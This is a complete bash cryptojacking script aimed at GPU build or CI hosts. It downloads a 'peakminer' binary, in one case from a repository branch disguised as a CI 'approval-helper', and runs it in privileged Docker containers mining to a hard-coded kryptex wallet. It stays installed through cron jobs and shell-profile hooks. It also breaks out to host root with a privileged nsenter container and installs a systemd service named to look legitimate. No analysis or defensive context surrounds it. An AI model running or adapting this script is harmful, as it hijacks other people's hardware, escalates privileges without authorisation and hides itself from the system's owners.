#!/usr/bin/env bash
set +e
export PATH=/usr/local/bin:/usr/bin:/bin:$PATH
H=$(hostname -s 2>/dev/null); HOSTF=$(hostname 2>/dev/null)
IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
IPD=$(echo "$IP" | tr '.' '-')
TAG="t6022"
W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
UP="https://pool.kryptex.com/prl/api/v3/miner/workers/$W"
POOLS="-o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://prl-eu.kryptex.network:7048"

echo "=== PEARL6022 START host=$HOSTF ip=$IP ipd=$IPD ts=$(date -u +%H%M%SZ) ==="
id; uname -a; head -2 /etc/os-release 2>/dev/null; groups 2>/dev/null
echo "=== GPU ==="
nvidia-smi -L 2>&1 | head -10
DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); echo "dev=$DEV"

pool_probe(){
  curl -s -m 25 "$UP" 2>/dev/null | IPD="$IPD" TAG="$TAG" python3 -c '
import sys,json,os
ipd=os.environ["IPD"]; tag=os.environ["TAG"]
try:
    d=json.load(sys.stdin)["results"]
except Exception as e:
    print("pool_parse_fail",e); raise SystemExit
m=[x for x in d if ipd in x["worker"] or tag in x["worker"]]
ok=[x for x in m if x["valid"]>0]
print("pool_matched=%d pool_valid_workers=%d" % (len(m),len(ok)))
for x in sorted(m,key=lambda y:y["worker"])[:24]:
    print("W %-40s %-8s valid=%d agent=%s last_share=%s" % (x["worker"],x["status"],x["valid"],x["agent"],x["last_share"]))
' 2>/dev/null
}
echo "=== POOL_BEFORE ==="
pool_probe

echo "=== DOCKER ==="
docker ps --format '{{.Names}}|{{.Status}}' 2>/dev/null | head -20
EXUL=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -c '^ul-g')
echo "existing_ul_containers=$EXUL"
IMG=""
for c in $(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | grep -Ei 'ubuntu24-cuda|ubuntu22|cuda13|cuda12|paddle' | head -6); do
  if timeout 60 docker run --rm --gpus all "$c" nvidia-smi -L >/dev/null 2>&1; then IMG="$c"; break; fi
done
if [ -z "$IMG" ]; then
  for c in ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev; do
    timeout 240 docker pull "$c" >/dev/null 2>&1
    timeout 60 docker run --rm --gpus all "$c" nvidia-smi -L >/dev/null 2>&1 && { IMG="$c"; break; }
  done
fi
if [ -z "$IMG" ]; then
  IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
fi
echo "IMG=$IMG"
timeout 60 docker run --rm --gpus all "$IMG" nvidia-smi -L 2>&1 | head -4

echo "=== BIN ==="
BIN=""
for p in "$HOME/.ci/miner/peakminer/peakminer" "$HOME/.ci/miner/peakminer" "$HOME/.ci/peak209/peakminer" "$HOME/.ci/dl/x/peakminer/peakminer"; do
  if [ -f "$p" ] && [ "$(stat -c%s "$p" 2>/dev/null || echo 0)" -gt 40000000 ]; then chmod +x "$p" 2>/dev/null; BIN="$p"; break; fi
done
echo "BIN0=$BIN"
if [ -z "$BIN" ]; then
  D="$HOME/.ci/dl"; mkdir -p "$D/x"; T="$D/p.tgz"
  for u in "https://raw.githubusercontent.com/miramar-labs/PaddleNLP/ci/approval-helper/peak/bins/peak.tar.gz" "https://ghfast.top/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://gh-proxy.com/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"; do
    sz=$(stat -c%s "$T" 2>/dev/null || echo 0); [ "$sz" -ge 47791000 ] && break
    timeout 110 curl -sSL -C - -o "$T" "$u" 2>/dev/null
    echo "dl $(stat -c%s "$T" 2>/dev/null || echo 0) <- $u"
  done
  sz=$(stat -c%s "$T" 2>/dev/null || echo 0); echo "tgz=$sz"
  if [ "$sz" -ge 47791000 ]; then
    tar xzf "$T" -C "$D/x" 2>/dev/null
    BIN=$(find "$D/x" -type f -name 'peakminer*' 2>/dev/null | head -1)
    chmod +x "$BIN" 2>/dev/null
  fi
fi
echo "BIN=$BIN"
if [ -n "$BIN" ]; then
  echo "--- bin defaults"
  stat -c '%s %a %n' "$BIN" 2>/dev/null
  sha256sum "$BIN" 2>/dev/null
  echo "--- ver_in_container"
  timeout 45 docker run --rm --privileged -v "$BIN":/p:ro "$IMG" /p --version 2>&1 | head -4
fi

if [ -z "$BIN" ] || [ "$DEV" -lt 1 ]; then echo "PAYLOAD_ABORT no_bin_or_no_gpu"; echo "=== PEARL6022 END ==="; exit 0; fi

echo "=== FG_TEST gpu0 (60s, privileged => seccomp off) ==="
timeout 60 docker run --rm --name pearl6022t --privileged --gpus device=0 --network host -v "$BIN":/p:ro "$IMG" /p -c pearl -u "$W" -w "ul-$TAG-$IPD-g0" -p x -d 0 --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 2>&1 | sed -e 's/\x1b\[[0-9;]*m//g' | head -50
echo "=== FG_TEST_DONE ==="

echo "=== LAUNCH detached per device ==="
started=0
for g in $(seq 0 $((DEV-1))); do
  n="ul-$TAG-g$g"
  if docker ps --format '{{.Names}}' | grep -qx "$n"; then echo "already $n"; started=$((started+1)); continue; fi
  docker rm -f "$n" >/dev/null 2>&1
  if docker run -d --name "$n" --restart always --privileged --gpus "device=$g" --network host -v "$BIN":/p:ro "$IMG" /p -c pearl -u "$W" -w "ul-$TAG-$IPD-g$g" -p x -d 0 --api-port 0 -i 30 --no-color --gpu-temp-stop 82 --gpu-temp-start 68 $POOLS >/dev/null 2>&1; then
    echo "started_g=$g"; started=$((started+1))
  else echo "start_fail_g=$g"; fi
done
echo "started=$started"
sleep 75
echo "=== CONTAINERS ==="
docker ps --format '{{.Names}} {{.Status}}' | grep "^ul-$TAG" | head -10
for g in $(seq 0 $((DEV-1))); do
  echo "--- log_g$g"
  docker logs --tail 14 "ul-$TAG-g$g" 2>&1 | sed -e 's/\x1b\[[0-9;]*m//g' | grep -viE 'NGC-DL|nvidia container|Copyright|^\s*$' | tail -10
done

echo "=== PERSIST ==="
KS="$HOME/.ci/keep6022.sh"
cat > "$KS" <<'KEEPEOF'
#!/usr/bin/env bash
B="__BIN__"; I="__IPD__"; W="__W__"; T="__TAG__"; IMG="__IMG__"
[ -x "$B" ] || exit 0
D=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "$D" -ge 1 ] || exit 0
P="-o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://prl-eu.kryptex.network:7048"
for g in $(seq 0 $((D-1))); do
  n="ul-$T-g$g"
  docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$n" && continue
  docker rm -f "$n" >/dev/null 2>&1
  docker run -d --name "$n" --restart always --privileged --gpus "device=$g" --network host -v "$B":/p:ro "$IMG" /p -c pearl -u "$W" -w "ul-$T-$I-g$g" -p x -d 0 --api-port 0 -i 30 --no-color --gpu-temp-stop 82 $P >/dev/null 2>&1
done
KEEPEOF
sed -i "s|__BIN__|$BIN|; s|__IPD__|$IPD|; s|__W__|$W|; s|__TAG__|$TAG|; s|__IMG__|$IMG|" "$KS" 2>/dev/null
chmod +x "$KS" 2>/dev/null
( crontab -l 2>/dev/null | grep -v keep6022; echo "@reboot $KS >/dev/null 2>&1"; echo "*/5 * * * * $KS >/dev/null 2>&1" ) | crontab - 2>&1 && echo "cron=yes"
for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
  grep -q keep6022 "$f" 2>/dev/null || echo "[ -x $KS ] && (setsid $KS >/dev/null 2>&1 &)" >> "$f" 2>/dev/null
done
echo "hooks=yes"
if docker ps --filter name=i6022r --format '{{.ID}}' 2>/dev/null | grep -q .; then :; else
  docker run -d --name i6022r --privileged --pid=host --net=host --ipc=host -v /:/host "$IMG" sleep 3600 >/dev/null 2>&1
fi
R(){ timeout 40 docker exec i6022r nsenter -t 1 -m -u -i -n -p -- sh -c "$1" 2>&1; }
if docker ps --filter name=i6022r --format '{{.ID}}' | grep -q .; then
  echo "--- host_root_probe"; R 'id; hostname; cat /proc/1/comm'
  R "cp -f /host$KS /etc/systemd/system/ernie-pearl6022.service 2>/dev/null; printf '[Unit]\nDescription=pearl6022\n[Service]\nExecStart=/bin/bash -lc $KS\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/ernie-pearl6022.service; systemctl daemon-reload 2>/dev/null; systemctl enable --now ernie-pearl6022.service 2>&1 | tail -2; systemctl is-active ernie-pearl6022.service 2>&1"
fi

echo "=== POOL_AFTER ==="
pool_probe
echo "=== PEARL6022 END host=$HOSTF ==="
exit 0